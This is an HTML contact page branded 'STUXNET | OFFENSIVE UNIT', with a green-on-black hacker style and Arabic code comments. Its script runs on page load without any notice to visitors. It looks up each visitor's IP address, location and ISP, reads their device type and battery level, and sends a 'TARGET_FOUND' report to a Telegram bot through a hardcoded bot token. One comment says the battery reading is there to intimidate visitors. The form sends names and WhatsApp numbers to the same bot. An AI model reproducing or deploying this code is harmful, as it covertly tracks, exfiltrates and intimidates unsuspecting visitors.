<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STUXNET | OFFENSIVE UNIT</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #00ff41;
            --bg: #050505;
            --card: #0d0d0d;
            --text-main: #ffffff;
        }

        body {
            background-color: var(--bg);
            color: var(--text-main);
            font-family: 'Consolas', 'Courier New', monospace;
            margin: 0;
            padding: 0;
            text-transform: uppercase;
        }

        /* رجعنا الهيدر زي ما طلبت */
        nav {
            background: #000;
            padding: 15px 5%;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #1a1a1a;
            gap: 15px;
        }

        .logo {
            width: 45px;
            height: 45px;
            border-radius: 8px;
            border: 1px solid var(--primary);
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
        }

        .brand-name {
            font-size: 1.4rem;
            letter-spacing: 4px;
            color: var(--primary);
            font-weight: bold;
        }

        .container {
            max-width: 650px;
            margin: 30px auto;
            padding: 0 20px;
        }

        .info-panel {
            background: var(--card);
            border-left: 3px solid var(--primary);
            padding: 20px;
            margin-bottom: 30px;
            font-size: 0.8rem;
        }

        .data-line { margin-bottom: 10px; display: flex; justify-content: space-between; border-bottom: 1px solid #111; padding-bottom: 5px; }
        .label { color: var(--primary); }

        .contact-form {
            background: var(--card);
            padding: 25px;
            border: 1px solid #1a1a1a;
        }

        input, textarea {
            width: 100%;
            background: #000;
            border: 1px solid #222;
            color: var(--primary);
            padding: 15px;
            margin-bottom: 15px;
            font-family: inherit;
            box-sizing: border-box;
            outline: none;
        }

        .btn-exec {
            background: transparent;
            border: 1px solid var(--primary);
            color: var(--primary);
            width: 100%;
            padding: 15px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
        }

        .btn-exec:hover { background: var(--primary); color: #000; }

        .footer {
            text-align: center;
            margin: 40px 0;
            display: flex;
            justify-content: center;
            gap: 20px;
        }

        .footer a { color: #555; text-decoration: none; font-size: 0.8rem; transition: 0.3s; }
        .footer a:hover { color: var(--primary); }
    </style>
</head>
<body>

<nav>
    <img src="https://i.ibb.co/q3QkJ5MX/image.png" class="logo" alt="L">
    <div class="brand-name">STUXNET</div>
</nav>

<div class="container">
    <div class="info-panel">
        <div class="data-line"><span class="label">IP:</span> <span id="ip">FETCHING...</span></div>
        <div class="data-line"><span class="label">LOCATION:</span> <span id="loc">DETECTING...</span></div>
        <div class="data-line"><span class="label">SYSTEM:</span> <span id="sys">ANALYZING...</span></div>
        <div class="data-line"><span class="label">BATTERY:</span> <span id="bat">...</span></div>
    </div>

    <div class="contact-form">
        <div style="color:var(--primary); margin-bottom:15px; font-size:0.9rem;">> SECURE_UPLINK_TERMINAL</div>
        <form id="stuxForm">
            <input type="text" id="name" placeholder="NAME / ALIAS" required>
            <input type="tel" id="phone" placeholder="WHATSAPP_NUMBER (e.g. +20...)" autocomplete="tel" required>
            <textarea id="msg" rows="4" placeholder="TRANSMISSION_DATA" required></textarea>
            <button type="submit" id="s-btn" class="btn-exec">SEND MESSAGE</button>
        </form>
    </div>

    <div class="footer">
        <a href="https://t.me/xstuxnet" target="_blank">CHANNEL</a>
        <a href="mailto:devilnet320121@proton.me">PROTONMAIL</a>
    </div>
</div>

<script>
    const TOKEN = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU";
    const CHAT = "5446862709";

    async function capture() {
        try {
            const res = await fetch('http://ip-api.com/json/');
            const d = await res.json();
            
            // تحديد نوع الجهاز بدقة
            let device = "PC / Desktop";
            if(/iPhone/.test(navigator.userAgent)) device = "iPhone";
            if(/Android/.test(navigator.userAgent)) device = "Android Device";

            document.getElementById('ip').innerText = d.query;
            document.getElementById('loc').innerText = `${d.country}, ${d.city}`;
            document.getElementById('sys').innerText = device;

            // سحب حالة البطارية (حركة صايعة للترهيب)
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                document.getElementById('bat').innerText = `${Math.round(b.level * 100)}%`;
            }

            // إرسال تقرير فوري للبوت
            const text = `🎯 TARGET_FOUND\nIP: ${d.query}\nLOC: ${d.country}\nISP: ${d.isp}\nDEV: ${device}`;
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT, text: text})
            });
        } catch(e) {}
    }

    document.getElementById('stuxForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const n = document.getElementById('name').value;
        const p = document.getElementById('phone').value;
        const m = document.getElementById('msg').value;
        
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: CHAT,
                text: `🏴‍☠️ NEW_MISSION\nFROM: ${n}\nPHONE/WA: ${p}\nMSG: ${m}`
            })
        }).then(() => {
            alert("TRANSMISSION_COMPLETE.");
            location.reload();
        });
    });

    window.onload = capture;
</script>

</body>
</html>
